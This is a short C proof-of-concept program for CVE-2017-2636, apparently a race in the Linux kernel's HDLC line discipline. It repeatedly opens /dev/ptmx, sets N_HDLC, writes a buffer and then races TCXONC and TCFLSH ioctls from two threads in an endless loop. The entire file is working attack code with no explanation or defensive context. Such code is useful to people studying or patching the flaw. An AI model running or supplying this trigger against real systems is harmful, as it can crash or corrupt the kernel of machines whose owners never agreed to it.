/*
 * cve-2017-2636 PoC
 */
#define	_GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <pthread.h>

void *thr0(void *arg)
{
	int fd = (int)(intptr_t)arg;
	ioctl(fd, TCXONC, TCOON);
	return (void *)0;
}

void *thr1(void *arg)
{
	int fd = (int)(intptr_t)arg;
	ioctl(fd, TCFLSH, TCIOFLUSH);
	return (void *)0;
}

int main(int argc, char *argv[])
{
	int n_hdlc = N_HDLC;
	char buf[100];
	memset(buf, 'a', 100);
	while (1) {
		int fd = open("/dev/ptmx", O_RDWR);
		ioctl(fd, TIOCSETD, &n_hdlc);
		ioctl(fd, TCXONC, TCOOFF);
		write(fd, buf, 100);

		pthread_t pth0, pth1;
		pthread_create(&pth0, NULL, thr0, (void *)(intptr_t)fd);
		pthread_create(&pth1, NULL, thr1, (void *)(intptr_t)fd);
		pthread_join(pth0, NULL);
		pthread_join(pth1, NULL);
		close(fd);
	}

	return 0;
}
